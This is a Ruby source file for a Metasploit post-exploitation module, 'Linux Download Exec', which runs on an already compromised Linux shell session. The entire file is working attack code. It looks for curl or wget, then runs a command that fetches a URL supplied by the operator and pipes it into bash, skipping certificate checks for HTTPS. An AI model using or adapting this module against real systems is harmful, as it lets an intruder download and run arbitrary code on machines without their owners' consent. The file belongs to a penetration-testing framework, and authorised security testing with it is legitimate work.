##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'
require 'msf/core/post/linux/priv'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Linux::System


	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Linux Download Exec',
			'Description'   => %q{
				This module downloads and runs a file with bash. It first
tries to uses curl as its HTTP client and then wget if it's not found. Bash
found in the PATH is used to execute the file.},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Joshua D. Abraham
				<jabra[at]praetorian.com>', ], 'Platform'      => [ 'linux' ],
				'SessionTypes'  => [ 'shell' ]))
		register_options(
		[
			OptString.new('URL', [true, 'Full URL of file to download.'])
		], self.class)

	end

	def exists_exe?(exe)
		path = expand_path(ENV['PATH'])
		if path.nil? or path.empty?
			return false
		end

		path.split(":").each{ |p|
			return true if file_exist?(p + "/" + exe)
		}

		return false
	end

	def run
		stdout_option = ""
		print_status("Checking if curl exists in the path...")
		if exists_exe?("curl")
			print_good("curl available, going ahead...")
			http_client = "curl"
			ssl_option = "-k"
		else
			print_warning("curl not available on the $PATH, checking for wget...")
			print_status("Checking if wget exists in the path...")
			if exists_exe?("wget")
				print_good("wget available, going ahead...")
				http_client = "wget"
				stdout_option =  "-O-"
				ssl_option = "--no-check-certificate"
			else
				print_warning("neither curl nor wget available in the $PATH, aborting...")
			return
			end
		end

		if datastore['URL'].match(/https/)
			cmd_exec_vprint("`which #{http_client}` #{stdout_option} #{ssl_option} #{datastore['URL']} 2>/dev/null | `which bash` ")
		else
			cmd_exec_vprint("`which #{http_client}` #{stdout_option} #{datastore['URL']} 2>/dev/null | `which bash` ")
		end
	end

	def cmd_exec_vprint(cmd)
		vprint_status("Executing: #{cmd}")
		output = cmd_exec(cmd)
		if output.length > 0
			vprint_status("#{output}")
		end
		return
	end
end
